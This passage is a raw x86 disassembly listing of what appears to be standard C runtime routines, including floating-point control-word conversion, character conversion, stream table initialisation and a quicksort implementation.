  408456:	89 45 f4             	mov    %eax,-0xc(%ebp)
  408459:	e8 35 10 00 00       	call   0x409493
  40845e:	59                   	pop    %ecx
  40845f:	59                   	pop    %ecx
  408460:	0f ae 5d f4          	stmxcsr -0xc(%ebp)
  408464:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408467:	33 c9                	xor    %ecx,%ecx
  408469:	84 c0                	test   %al,%al
  40846b:	79 03                	jns    0x408470
  40846d:	6a 10                	push   $0x10
  40846f:	59                   	pop    %ecx
  408470:	a9 00 02 00 00       	test   $0x200,%eax
  408475:	74 03                	je     0x40847a
  408477:	83 c9 08             	or     $0x8,%ecx
  40847a:	a9 00 04 00 00       	test   $0x400,%eax
  40847f:	74 03                	je     0x408484
  408481:	83 c9 04             	or     $0x4,%ecx
  408484:	a9 00 08 00 00       	test   $0x800,%eax
  408489:	74 03                	je     0x40848e
  40848b:	83 c9 02             	or     $0x2,%ecx
  40848e:	a9 00 10 00 00       	test   $0x1000,%eax
  408493:	74 03                	je     0x408498
  408495:	83 c9 01             	or     $0x1,%ecx
  408498:	a9 00 01 00 00       	test   $0x100,%eax
  40849d:	74 06                	je     0x4084a5
  40849f:	81 c9 00 00 08 00    	or     $0x80000,%ecx
  4084a5:	8b d0                	mov    %eax,%edx
  4084a7:	bf 00 60 00 00       	mov    $0x6000,%edi
  4084ac:	23 d7                	and    %edi,%edx
  4084ae:	74 2a                	je     0x4084da
  4084b0:	81 fa 00 20 00 00    	cmp    $0x2000,%edx
  4084b6:	74 1c                	je     0x4084d4
  4084b8:	81 fa 00 40 00 00    	cmp    $0x4000,%edx
  4084be:	74 0c                	je     0x4084cc
  4084c0:	3b d7                	cmp    %edi,%edx
  4084c2:	75 16                	jne    0x4084da
  4084c4:	81 c9 00 03 00 00    	or     $0x300,%ecx
  4084ca:	eb 0e                	jmp    0x4084da
  4084cc:	81 c9 00 02 00 00    	or     $0x200,%ecx
  4084d2:	eb 06                	jmp    0x4084da
  4084d4:	81 c9 00 01 00 00    	or     $0x100,%ecx
  4084da:	25 40 80 00 00       	and    $0x8040,%eax
  4084df:	2b c3                	sub    %ebx,%eax
  4084e1:	74 1b                	je     0x4084fe
  4084e3:	2d c0 7f 00 00       	sub    $0x7fc0,%eax
  4084e8:	74 0c                	je     0x4084f6
  4084ea:	2b c3                	sub    %ebx,%eax
  4084ec:	75 16                	jne    0x408504
  4084ee:	81 c9 00 00 00 01    	or     $0x1000000,%ecx
  4084f4:	eb 0e                	jmp    0x408504
  4084f6:	81 c9 00 00 00 03    	or     $0x3000000,%ecx
  4084fc:	eb 06                	jmp    0x408504
  4084fe:	81 c9 00 00 00 02    	or     $0x2000000,%ecx
  408504:	8b c1                	mov    %ecx,%eax
  408506:	0b ce                	or     %esi,%ecx
  408508:	33 c6                	xor    %esi,%eax
  40850a:	a9 1f 03 08 00       	test   $0x8031f,%eax
  40850f:	74 06                	je     0x408517
  408511:	81 c9 00 00 00 80    	or     $0x80000000,%ecx
  408517:	8b c1                	mov    %ecx,%eax
  408519:	eb 02                	jmp    0x40851d
  40851b:	8b c6                	mov    %esi,%eax
  40851d:	5f                   	pop    %edi
  40851e:	5e                   	pop    %esi
  40851f:	5b                   	pop    %ebx
  408520:	8b e5                	mov    %ebp,%esp
  408522:	5d                   	pop    %ebp
  408523:	c3                   	ret
  408524:	8b ff                	mov    %edi,%edi
  408526:	55                   	push   %ebp
  408527:	8b ec                	mov    %esp,%ebp
  408529:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40852c:	33 c0                	xor    %eax,%eax
  40852e:	f6 c1 10             	test   $0x10,%cl
  408531:	74 01                	je     0x408534
  408533:	40                   	inc    %eax
  408534:	f6 c1 08             	test   $0x8,%cl
  408537:	74 03                	je     0x40853c
  408539:	83 c8 04             	or     $0x4,%eax
  40853c:	f6 c1 04             	test   $0x4,%cl
  40853f:	74 03                	je     0x408544
  408541:	83 c8 08             	or     $0x8,%eax
  408544:	f6 c1 02             	test   $0x2,%cl
  408547:	74 03                	je     0x40854c
  408549:	83 c8 10             	or     $0x10,%eax
  40854c:	f6 c1 01             	test   $0x1,%cl
  40854f:	74 03                	je     0x408554
  408551:	83 c8 20             	or     $0x20,%eax
  408554:	f7 c1 00 00 08 00    	test   $0x80000,%ecx
  40855a:	74 03                	je     0x40855f
  40855c:	83 c8 02             	or     $0x2,%eax
  40855f:	56                   	push   %esi
  408560:	8b d1                	mov    %ecx,%edx
  408562:	be 00 03 00 00       	mov    $0x300,%esi
  408567:	57                   	push   %edi
  408568:	bf 00 02 00 00       	mov    $0x200,%edi
  40856d:	23 d6                	and    %esi,%edx
  40856f:	74 23                	je     0x408594
  408571:	81 fa 00 01 00 00    	cmp    $0x100,%edx
  408577:	74 16                	je     0x40858f
  408579:	3b d7                	cmp    %edi,%edx
  40857b:	74 0b                	je     0x408588
  40857d:	3b d6                	cmp    %esi,%edx
  40857f:	75 13                	jne    0x408594
  408581:	0d 00 0c 00 00       	or     $0xc00,%eax
  408586:	eb 0c                	jmp    0x408594
  408588:	0d 00 08 00 00       	or     $0x800,%eax
  40858d:	eb 05                	jmp    0x408594
  40858f:	0d 00 04 00 00       	or     $0x400,%eax
  408594:	8b d1                	mov    %ecx,%edx
  408596:	81 e2 00 00 03 00    	and    $0x30000,%edx
  40859c:	74 0c                	je     0x4085aa
  40859e:	81 fa 00 00 01 00    	cmp    $0x10000,%edx
  4085a4:	75 06                	jne    0x4085ac
  4085a6:	0b c7                	or     %edi,%eax
  4085a8:	eb 02                	jmp    0x4085ac
  4085aa:	0b c6                	or     %esi,%eax
  4085ac:	5f                   	pop    %edi
  4085ad:	5e                   	pop    %esi
  4085ae:	f7 c1 00 00 04 00    	test   $0x40000,%ecx
  4085b4:	74 05                	je     0x4085bb
  4085b6:	0d 00 10 00 00       	or     $0x1000,%eax
  4085bb:	5d                   	pop    %ebp
  4085bc:	c3                   	ret
  4085bd:	8b ff                	mov    %edi,%edi
  4085bf:	55                   	push   %ebp
  4085c0:	8b ec                	mov    %esp,%ebp
  4085c2:	83 ec 10             	sub    $0x10,%esp
  4085c5:	53                   	push   %ebx
  4085c6:	56                   	push   %esi
  4085c7:	8b 75 0c             	mov    0xc(%ebp),%esi
  4085ca:	85 f6                	test   %esi,%esi
  4085cc:	74 18                	je     0x4085e6
  4085ce:	8b 5d 10             	mov    0x10(%ebp),%ebx
  4085d1:	85 db                	test   %ebx,%ebx
  4085d3:	74 11                	je     0x4085e6
  4085d5:	80 3e 00             	cmpb   $0x0,(%esi)
  4085d8:	75 14                	jne    0x4085ee
  4085da:	8b 45 08             	mov    0x8(%ebp),%eax
  4085dd:	85 c0                	test   %eax,%eax
  4085df:	74 05                	je     0x4085e6
  4085e1:	33 c9                	xor    %ecx,%ecx
  4085e3:	66 89 08             	mov    %cx,(%eax)
  4085e6:	33 c0                	xor    %eax,%eax
  4085e8:	5e                   	pop    %esi
  4085e9:	5b                   	pop    %ebx
  4085ea:	8b e5                	mov    %ebp,%esp
  4085ec:	5d                   	pop    %ebp
  4085ed:	c3                   	ret
  4085ee:	57                   	push   %edi
  4085ef:	ff 75 14             	push   0x14(%ebp)
  4085f2:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4085f5:	e8 83 cd ff ff       	call   0x40537d
  4085fa:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4085fd:	83 b8 a8 00 00 00 00 	cmpl   $0x0,0xa8(%eax)
  408604:	75 15                	jne    0x40861b
  408606:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408609:	85 c9                	test   %ecx,%ecx
  40860b:	74 06                	je     0x408613
  40860d:	0f b6 06             	movzbl (%esi),%eax
  408610:	66 89 01             	mov    %ax,(%ecx)
  408613:	33 ff                	xor    %edi,%edi
  408615:	47                   	inc    %edi
  408616:	e9 84 00 00 00       	jmp    0x40869f
  40861b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40861e:	50                   	push   %eax
  40861f:	0f b6 06             	movzbl (%esi),%eax
  408622:	50                   	push   %eax
  408623:	e8 8d 0f 00 00       	call   0x4095b5
  408628:	59                   	pop    %ecx
  408629:	59                   	pop    %ecx
  40862a:	85 c0                	test   %eax,%eax
  40862c:	74 40                	je     0x40866e
  40862e:	8b 7d f4             	mov    -0xc(%ebp),%edi
  408631:	83 7f 04 01          	cmpl   $0x1,0x4(%edi)
  408635:	7e 27                	jle    0x40865e
  408637:	3b 5f 04             	cmp    0x4(%edi),%ebx
  40863a:	7c 25                	jl     0x408661
  40863c:	33 c0                	xor    %eax,%eax
  40863e:	39 45 08             	cmp    %eax,0x8(%ebp)
  408641:	0f 95 c0             	setne  %al
  408644:	50                   	push   %eax
  408645:	ff 75 08             	push   0x8(%ebp)
  408648:	ff 77 04             	push   0x4(%edi)
  40864b:	56                   	push   %esi
  40864c:	6a 09                	push   $0x9
  40864e:	ff 77 08             	push   0x8(%edi)
  408651:	ff 15 b8 d0 40 00    	call   *0x40d0b8
  408657:	8b 7d f4             	mov    -0xc(%ebp),%edi
  40865a:	85 c0                	test   %eax,%eax
  40865c:	75 0b                	jne    0x408669
  40865e:	3b 5f 04             	cmp    0x4(%edi),%ebx
  408661:	72 2e                	jb     0x408691
  408663:	80 7e 01 00          	cmpb   $0x0,0x1(%esi)
  408667:	74 28                	je     0x408691
  408669:	8b 7f 04             	mov    0x4(%edi),%edi
  40866c:	eb 31                	jmp    0x40869f
  40866e:	33 c0                	xor    %eax,%eax
  408670:	39 45 08             	cmp    %eax,0x8(%ebp)
  408673:	0f 95 c0             	setne  %al
  408676:	33 ff                	xor    %edi,%edi
  408678:	50                   	push   %eax
  408679:	ff 75 08             	push   0x8(%ebp)
  40867c:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40867f:	47                   	inc    %edi
  408680:	57                   	push   %edi
  408681:	56                   	push   %esi
  408682:	6a 09                	push   $0x9
  408684:	ff 70 08             	push   0x8(%eax)
  408687:	ff 15 b8 d0 40 00    	call   *0x40d0b8
  40868d:	85 c0                	test   %eax,%eax
  40868f:	75 0e                	jne    0x40869f
  408691:	e8 63 d5 ff ff       	call   0x405bf9
  408696:	83 cf ff             	or     $0xffffffff,%edi
  408699:	c7 00 2a 00 00 00    	movl   $0x2a,(%eax)
  40869f:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  4086a3:	74 0a                	je     0x4086af
  4086a5:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4086a8:	83 a1 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%ecx)
  4086af:	8b c7                	mov    %edi,%eax
  4086b1:	5f                   	pop    %edi
  4086b2:	e9 31 ff ff ff       	jmp    0x4085e8
  4086b7:	8b ff                	mov    %edi,%edi
  4086b9:	55                   	push   %ebp
  4086ba:	8b ec                	mov    %esp,%ebp
  4086bc:	6a 00                	push   $0x0
  4086be:	ff 75 10             	push   0x10(%ebp)
  4086c1:	ff 75 0c             	push   0xc(%ebp)
  4086c4:	ff 75 08             	push   0x8(%ebp)
  4086c7:	e8 f1 fe ff ff       	call   0x4085bd
  4086cc:	83 c4 10             	add    $0x10,%esp
  4086cf:	5d                   	pop    %ebp
  4086d0:	c3                   	ret
  4086d1:	8b ff                	mov    %edi,%edi
  4086d3:	55                   	push   %ebp
  4086d4:	8b ec                	mov    %esp,%ebp
  4086d6:	56                   	push   %esi
  4086d7:	8b 75 0c             	mov    0xc(%ebp),%esi
  4086da:	8b 06                	mov    (%esi),%eax
  4086dc:	3b 05 94 51 41 00    	cmp    0x415194,%eax
  4086e2:	74 17                	je     0x4086fb
  4086e4:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4086e7:	a1 a0 46 41 00       	mov    0x4146a0,%eax
  4086ec:	85 81 50 03 00 00    	test   %eax,0x350(%ecx)
  4086f2:	75 07                	jne    0x4086fb
  4086f4:	e8 5b f4 ff ff       	call   0x407b54
  4086f9:	89 06                	mov    %eax,(%esi)
  4086fb:	5e                   	pop    %esi
  4086fc:	5d                   	pop    %ebp
  4086fd:	c3                   	ret
  4086fe:	8b ff                	mov    %edi,%edi
  408700:	55                   	push   %ebp
  408701:	8b ec                	mov    %esp,%ebp
  408703:	56                   	push   %esi
  408704:	8b 75 0c             	mov    0xc(%ebp),%esi
  408707:	8b 06                	mov    (%esi),%eax
  408709:	3b 05 78 45 41 00    	cmp    0x414578,%eax
  40870f:	74 17                	je     0x408728
  408711:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408714:	a1 a0 46 41 00       	mov    0x4146a0,%eax
  408719:	85 81 50 03 00 00    	test   %eax,0x350(%ecx)
  40871f:	75 07                	jne    0x408728
  408721:	e8 23 df ff ff       	call   0x406649
  408726:	89 06                	mov    %eax,(%esi)
  408728:	5e                   	pop    %esi
  408729:	5d                   	pop    %ebp
  40872a:	c3                   	ret
  40872b:	8b ff                	mov    %edi,%edi
  40872d:	55                   	push   %ebp
  40872e:	8b ec                	mov    %esp,%ebp
  408730:	8b 45 08             	mov    0x8(%ebp),%eax
  408733:	85 c0                	test   %eax,%eax
  408735:	75 15                	jne    0x40874c
  408737:	e8 bd d4 ff ff       	call   0x405bf9
  40873c:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  408742:	e8 f6 d3 ff ff       	call   0x405b3d
  408747:	83 c8 ff             	or     $0xffffffff,%eax
  40874a:	5d                   	pop    %ebp
  40874b:	c3                   	ret
  40874c:	8b 40 10             	mov    0x10(%eax),%eax
  40874f:	5d                   	pop    %ebp
  408750:	c3                   	ret
  408751:	a1 c0 51 41 00       	mov    0x4151c0,%eax
  408756:	56                   	push   %esi
  408757:	6a 03                	push   $0x3
  408759:	5e                   	pop    %esi
  40875a:	85 c0                	test   %eax,%eax
  40875c:	75 07                	jne    0x408765
  40875e:	b8 00 02 00 00       	mov    $0x200,%eax
  408763:	eb 06                	jmp    0x40876b
  408765:	3b c6                	cmp    %esi,%eax
  408767:	7d 07                	jge    0x408770
  408769:	8b c6                	mov    %esi,%eax
  40876b:	a3 c0 51 41 00       	mov    %eax,0x4151c0
  408770:	6a 04                	push   $0x4
  408772:	50                   	push   %eax
  408773:	e8 94 d4 ff ff       	call   0x405c0c
  408778:	6a 00                	push   $0x0
  40877a:	a3 c4 51 41 00       	mov    %eax,0x4151c4
  40877f:	e8 e5 d4 ff ff       	call   0x405c69
  408784:	83 c4 0c             	add    $0xc,%esp
  408787:	83 3d c4 51 41 00 00 	cmpl   $0x0,0x4151c4
  40878e:	75 2b                	jne    0x4087bb
  408790:	6a 04                	push   $0x4
  408792:	56                   	push   %esi
  408793:	89 35 c0 51 41 00    	mov    %esi,0x4151c0
  408799:	e8 6e d4 ff ff       	call   0x405c0c
  40879e:	6a 00                	push   $0x0
  4087a0:	a3 c4 51 41 00       	mov    %eax,0x4151c4
  4087a5:	e8 bf d4 ff ff       	call   0x405c69
  4087aa:	83 c4 0c             	add    $0xc,%esp
  4087ad:	83 3d c4 51 41 00 00 	cmpl   $0x0,0x4151c4
  4087b4:	75 05                	jne    0x4087bb
  4087b6:	83 c8 ff             	or     $0xffffffff,%eax
  4087b9:	5e                   	pop    %esi
  4087ba:	c3                   	ret
  4087bb:	57                   	push   %edi
  4087bc:	33 ff                	xor    %edi,%edi
  4087be:	be a8 46 41 00       	mov    $0x4146a8,%esi
  4087c3:	6a 00                	push   $0x0
  4087c5:	68 a0 0f 00 00       	push   $0xfa0
  4087ca:	8d 46 20             	lea    0x20(%esi),%eax
  4087cd:	50                   	push   %eax
  4087ce:	e8 e0 e5 ff ff       	call   0x406db3
  4087d3:	a1 c4 51 41 00       	mov    0x4151c4,%eax
  4087d8:	8b d7                	mov    %edi,%edx
  4087da:	c1 fa 06             	sar    $0x6,%edx
  4087dd:	89 34 b8             	mov    %esi,(%eax,%edi,4)
  4087e0:	8b c7                	mov    %edi,%eax
  4087e2:	83 e0 3f             	and    $0x3f,%eax
  4087e5:	6b c8 30             	imul   $0x30,%eax,%ecx
  4087e8:	8b 04 95 90 4f 41 00 	mov    0x414f90(,%edx,4),%eax
  4087ef:	8b 44 08 18          	mov    0x18(%eax,%ecx,1),%eax
  4087f3:	83 f8 ff             	cmp    $0xffffffff,%eax
  4087f6:	74 09                	je     0x408801
  4087f8:	83 f8 fe             	cmp    $0xfffffffe,%eax
  4087fb:	74 04                	je     0x408801
  4087fd:	85 c0                	test   %eax,%eax
  4087ff:	75 07                	jne    0x408808
  408801:	c7 46 10 fe ff ff ff 	movl   $0xfffffffe,0x10(%esi)
  408808:	83 c6 38             	add    $0x38,%esi
  40880b:	47                   	inc    %edi
  40880c:	81 fe 50 47 41 00    	cmp    $0x414750,%esi
  408812:	75 af                	jne    0x4087c3
  408814:	5f                   	pop    %edi
  408815:	33 c0                	xor    %eax,%eax
  408817:	5e                   	pop    %esi
  408818:	c3                   	ret
  408819:	8b ff                	mov    %edi,%edi
  40881b:	56                   	push   %esi
  40881c:	e8 91 0b 00 00       	call   0x4093b2
  408821:	e8 c8 0d 00 00       	call   0x4095ee
  408826:	33 f6                	xor    %esi,%esi
  408828:	a1 c4 51 41 00       	mov    0x4151c4,%eax
  40882d:	ff 34 06             	push   (%esi,%eax,1)
  408830:	e8 59 0e 00 00       	call   0x40968e
  408835:	a1 c4 51 41 00       	mov    0x4151c4,%eax
  40883a:	59                   	pop    %ecx
  40883b:	8b 04 06             	mov    (%esi,%eax,1),%eax
  40883e:	83 c0 20             	add    $0x20,%eax
  408841:	50                   	push   %eax
  408842:	ff 15 88 d0 40 00    	call   *0x40d088
  408848:	83 c6 04             	add    $0x4,%esi
  40884b:	83 fe 0c             	cmp    $0xc,%esi
  40884e:	75 d8                	jne    0x408828
  408850:	ff 35 c4 51 41 00    	push   0x4151c4
  408856:	e8 0e d4 ff ff       	call   0x405c69
  40885b:	83 25 c4 51 41 00 00 	andl   $0x0,0x4151c4
  408862:	59                   	pop    %ecx
  408863:	5e                   	pop    %esi
  408864:	c3                   	ret
  408865:	8b ff                	mov    %edi,%edi
  408867:	55                   	push   %ebp
  408868:	8b ec                	mov    %esp,%ebp
  40886a:	8b 45 08             	mov    0x8(%ebp),%eax
  40886d:	83 c0 20             	add    $0x20,%eax
  408870:	50                   	push   %eax
  408871:	ff 15 80 d0 40 00    	call   *0x40d080
  408877:	5d                   	pop    %ebp
  408878:	c3                   	ret
  408879:	8b ff                	mov    %edi,%edi
  40887b:	55                   	push   %ebp
  40887c:	8b ec                	mov    %esp,%ebp
  40887e:	8b 45 08             	mov    0x8(%ebp),%eax
  408881:	83 c0 20             	add    $0x20,%eax
  408884:	50                   	push   %eax
  408885:	ff 15 84 d0 40 00    	call   *0x40d084
  40888b:	5d                   	pop    %ebp
  40888c:	c3                   	ret
  40888d:	cc                   	int3
  40888e:	cc                   	int3
  40888f:	cc                   	int3
  408890:	8b ff                	mov    %edi,%edi
  408892:	55                   	push   %ebp
  408893:	8b ec                	mov    %esp,%ebp
  408895:	51                   	push   %ecx
  408896:	a1 00 40 41 00       	mov    0x414000,%eax
  40889b:	33 c5                	xor    %ebp,%eax
  40889d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4088a0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4088a3:	53                   	push   %ebx
  4088a4:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4088a7:	3b d9                	cmp    %ecx,%ebx
  4088a9:	76 6c                	jbe    0x408917
  4088ab:	8b 45 10             	mov    0x10(%ebp),%eax
  4088ae:	56                   	push   %esi
  4088af:	57                   	push   %edi
  4088b0:	8d 14 01             	lea    (%ecx,%eax,1),%edx
  4088b3:	8b f2                	mov    %edx,%esi
  4088b5:	8b f9                	mov    %ecx,%edi
  4088b7:	3b f3                	cmp    %ebx,%esi
  4088b9:	77 28                	ja     0x4088e3
  4088bb:	eb 03                	jmp    0x4088c0
  4088bd:	8d 49 00             	lea    0x0(%ecx),%ecx
  4088c0:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4088c3:	57                   	push   %edi
  4088c4:	56                   	push   %esi
  4088c5:	ff 15 3c d1 40 00    	call   *0x40d13c
  4088cb:	ff 55 14             	call   *0x14(%ebp)
  4088ce:	83 c4 08             	add    $0x8,%esp
  4088d1:	85 c0                	test   %eax,%eax
  4088d3:	7e 02                	jle    0x4088d7
  4088d5:	8b fe                	mov    %esi,%edi
  4088d7:	8b 45 10             	mov    0x10(%ebp),%eax
  4088da:	03 f0                	add    %eax,%esi
  4088dc:	3b f3                	cmp    %ebx,%esi
  4088de:	76 e0                	jbe    0x4088c0
  4088e0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4088e3:	8b f0                	mov    %eax,%esi
  4088e5:	8b d3                	mov    %ebx,%edx
  4088e7:	3b fb                	cmp    %ebx,%edi
  4088e9:	74 21                	je     0x40890c
  4088eb:	85 c0                	test   %eax,%eax
  4088ed:	74 1d                	je     0x40890c
  4088ef:	2b fb                	sub    %ebx,%edi
  4088f1:	8a 02                	mov    (%edx),%al
  4088f3:	8d 52 01             	lea    0x1(%edx),%edx
  4088f6:	8a 4c 17 ff          	mov    -0x1(%edi,%edx,1),%cl
  4088fa:	88 44 17 ff          	mov    %al,-0x1(%edi,%edx,1)
  4088fe:	88 4a ff             	mov    %cl,-0x1(%edx)
  408901:	83 ee 01             	sub    $0x1,%esi
  408904:	75 eb                	jne    0x4088f1
  408906:	8b 45 10             	mov    0x10(%ebp),%eax
  408909:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40890c:	2b d8                	sub    %eax,%ebx
  40890e:	8d 14 01             	lea    (%ecx,%eax,1),%edx
  408911:	3b d9                	cmp    %ecx,%ebx
  408913:	77 9e                	ja     0x4088b3
  408915:	5f                   	pop    %edi
  408916:	5e                   	pop    %esi
  408917:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40891a:	33 cd                	xor    %ebp,%ecx
  40891c:	5b                   	pop    %ebx
  40891d:	e8 3c 89 ff ff       	call   0x40125e
  408922:	8b e5                	mov    %ebp,%esp
  408924:	5d                   	pop    %ebp
  408925:	c3                   	ret
  408926:	cc                   	int3
  408927:	cc                   	int3
  408928:	cc                   	int3
  408929:	cc                   	int3
  40892a:	cc                   	int3
  40892b:	cc                   	int3
  40892c:	cc                   	int3
  40892d:	cc                   	int3
  40892e:	cc                   	int3
  40892f:	cc                   	int3
  408930:	8b ff                	mov    %edi,%edi
  408932:	55                   	push   %ebp
  408933:	8b ec                	mov    %esp,%ebp
  408935:	8b 45 0c             	mov    0xc(%ebp),%eax
  408938:	57                   	push   %edi
  408939:	8b 7d 08             	mov    0x8(%ebp),%edi
  40893c:	3b f8                	cmp    %eax,%edi
  40893e:	74 26                	je     0x408966
  408940:	56                   	push   %esi
  408941:	8b 75 10             	mov    0x10(%ebp),%esi
  408944:	85 f6                	test   %esi,%esi
  408946:	74 1d                	je     0x408965
  408948:	2b f8                	sub    %eax,%edi
  40894a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  408950:	8a 08                	mov    (%eax),%cl
  408952:	8d 40 01             	lea    0x1(%eax),%eax
  408955:	8a 54 07 ff          	mov    -0x1(%edi,%eax,1),%dl
  408959:	88 4c 07 ff          	mov    %cl,-0x1(%edi,%eax,1)
  40895d:	88 50 ff             	mov    %dl,-0x1(%eax)
  408960:	83 ee 01             	sub    $0x1,%esi
  408963:	75 eb                	jne    0x408950
  408965:	5e                   	pop    %esi
  408966:	5f                   	pop    %edi
  408967:	5d                   	pop    %ebp
  408968:	c3                   	ret
  408969:	cc                   	int3
  40896a:	cc                   	int3
  40896b:	cc                   	int3
  40896c:	cc                   	int3
  40896d:	cc                   	int3
  40896e:	cc                   	int3
  40896f:	cc                   	int3
  408970:	8b ff                	mov    %edi,%edi
  408972:	55                   	push   %ebp
  408973:	8b ec                	mov    %esp,%ebp
  408975:	81 ec 1c 01 00 00    	sub    $0x11c,%esp
  40897b:	a1 00 40 41 00       	mov    0x414000,%eax
  408980:	33 c5                	xor    %ebp,%eax
  408982:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408985:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408988:	8b 55 0c             	mov    0xc(%ebp),%edx
  40898b:	89 8d fc fe ff ff    	mov    %ecx,-0x104(%ebp)
  408991:	56                   	push   %esi
  408992:	8b 75 14             	mov    0x14(%ebp),%esi
  408995:	89 b5 00 ff ff ff    	mov    %esi,-0x100(%ebp)
  40899b:	57                   	push   %edi
  40899c:	8b 7d 10             	mov    0x10(%ebp),%edi
  40899f:	89 bd 04 ff ff ff    	mov    %edi,-0xfc(%ebp)
  4089a5:	85 c9                	test   %ecx,%ecx
  4089a7:	75 24                	jne    0x4089cd
  4089a9:	85 d2                	test   %edx,%edx
  4089ab:	74 20                	je     0x4089cd
  4089ad:	e8 47 d2 ff ff       	call   0x405bf9
  4089b2:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  4089b8:	e8 80 d1 ff ff       	call   0x405b3d
  4089bd:	5f                   	pop    %edi
  4089be:	5e                   	pop    %esi
  4089bf:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4089c2:	33 cd                	xor    %ebp,%ecx
  4089c4:	e8 95 88 ff ff       	call   0x40125e
  4089c9:	8b e5                	mov    %ebp,%esp
  4089cb:	5d                   	pop    %ebp
  4089cc:	c3                   	ret
  4089cd:	85 ff                	test   %edi,%edi
  4089cf:	74 dc                	je     0x4089ad
  4089d1:	85 f6                	test   %esi,%esi
  4089d3:	74 d8                	je     0x4089ad
  4089d5:	c7 85 f8 fe ff ff 00 	movl   $0x0,-0x108(%ebp)
  4089dc:	00 00 00 
  4089df:	83 fa 02             	cmp    $0x2,%edx
  4089e2:	0f 82 12 03 00 00    	jb     0x408cfa
  4089e8:	4a                   	dec    %edx
  4089e9:	0f af d7             	imul   %edi,%edx
  4089ec:	53                   	push   %ebx
  4089ed:	03 d1                	add    %ecx,%edx
  4089ef:	89 95 08 ff ff ff    	mov    %edx,-0xf8(%ebp)
  4089f5:	8b c2                	mov    %edx,%eax
  4089f7:	33 d2                	xor    %edx,%edx
  4089f9:	2b c1                	sub    %ecx,%eax
  4089fb:	f7 f7                	div    %edi
  4089fd:	8d 58 01             	lea    0x1(%eax),%ebx
  408a00:	83 fb 08             	cmp    $0x8,%ebx
  408a03:	77 16                	ja     0x408a1b
  408a05:	56                   	push   %esi
  408a06:	57                   	push   %edi
  408a07:	ff b5 08 ff ff ff    	push   -0xf8(%ebp)
  408a0d:	51                   	push   %ecx
  408a0e:	e8 7d fe ff ff       	call   0x408890
  408a13:	83 c4 10             	add    $0x10,%esp
  408a16:	e9 b7 02 00 00       	jmp    0x408cd2
  408a1b:	d1 eb                	shr    $1,%ebx
  408a1d:	0f af df             	imul   %edi,%ebx
  408a20:	03 d9                	add    %ecx,%ebx
  408a22:	53                   	push   %ebx
  408a23:	51                   	push   %ecx
  408a24:	8b ce                	mov    %esi,%ecx
  408a26:	89 9d f0 fe ff ff    	mov    %ebx,-0x110(%ebp)
  408a2c:	ff 15 3c d1 40 00    	call   *0x40d13c
  408a32:	ff d6                	call   *%esi
  408a34:	83 c4 08             	add    $0x8,%esp
  408a37:	85 c0                	test   %eax,%eax
  408a39:	7e 10                	jle    0x408a4b
  408a3b:	57                   	push   %edi
  408a3c:	53                   	push   %ebx
  408a3d:	ff b5 fc fe ff ff    	push   -0x104(%ebp)
  408a43:	e8 e8 fe ff ff       	call   0x408930
  408a48:	83 c4 0c             	add    $0xc,%esp
  408a4b:	ff b5 08 ff ff ff    	push   -0xf8(%ebp)
  408a51:	8b ce                	mov    %esi,%ecx
  408a53:	ff b5 fc fe ff ff    	push   -0x104(%ebp)
  408a59:	ff 15 3c d1 40 00    	call   *0x40d13c
  408a5f:	ff d6                	call   *%esi
  408a61:	83 c4 08             	add    $0x8,%esp
  408a64:	85 c0                	test   %eax,%eax
  408a66:	7e 15                	jle    0x408a7d
  408a68:	57                   	push   %edi
  408a69:	ff b5 08 ff ff ff    	push   -0xf8(%ebp)
  408a6f:	ff b5 fc fe ff ff    	push   -0x104(%ebp)
  408a75:	e8 b6 fe ff ff       	call   0x408930
  408a7a:	83 c4 0c             	add    $0xc,%esp
  408a7d:	ff b5 08 ff ff ff    	push   -0xf8(%ebp)
  408a83:	8b ce                	mov    %esi,%ecx
  408a85:	53                   	push   %ebx
  408a86:	ff 15 3c d1 40 00    	call   *0x40d13c
  408a8c:	ff d6                	call   *%esi
  408a8e:	83 c4 08             	add    $0x8,%esp
  408a91:	85 c0                	test   %eax,%eax
  408a93:	7e 10                	jle    0x408aa5
  408a95:	57                   	push   %edi
  408a96:	ff b5 08 ff ff ff    	push   -0xf8(%ebp)
  408a9c:	53                   	push   %ebx
  408a9d:	e8 8e fe ff ff       	call   0x408930
  408aa2:	83 c4 0c             	add    $0xc,%esp
  408aa5:	8b 85 08 ff ff ff    	mov    -0xf8(%ebp),%eax
  408aab:	8b f8                	mov    %eax,%edi
  408aad:	8b b5 fc fe ff ff    	mov    -0x104(%ebp),%esi
  408ab3:	8b 95 04 ff ff ff    	mov    -0xfc(%ebp),%edx
  408ab9:	89 85 ec fe ff ff    	mov    %eax,-0x114(%ebp)
  408abf:	90                   	nop
  408ac0:	3b de                	cmp    %esi,%ebx
  408ac2:	76 37                	jbe    0x408afb
  408ac4:	03 f2                	add    %edx,%esi
  408ac6:	89 b5 f4 fe ff ff    	mov    %esi,-0x10c(%ebp)
  408acc:	3b f3                	cmp    %ebx,%esi
  408ace:	73 25                	jae    0x408af5
  408ad0:	8b 8d 00 ff ff ff    	mov    -0x100(%ebp),%ecx
  408ad6:	53                   	push   %ebx
  408ad7:	56                   	push   %esi
  408ad8:	ff 15 3c d1 40 00    	call   *0x40d13c
  408ade:	ff 95 00 ff ff ff    	call   *-0x100(%ebp)
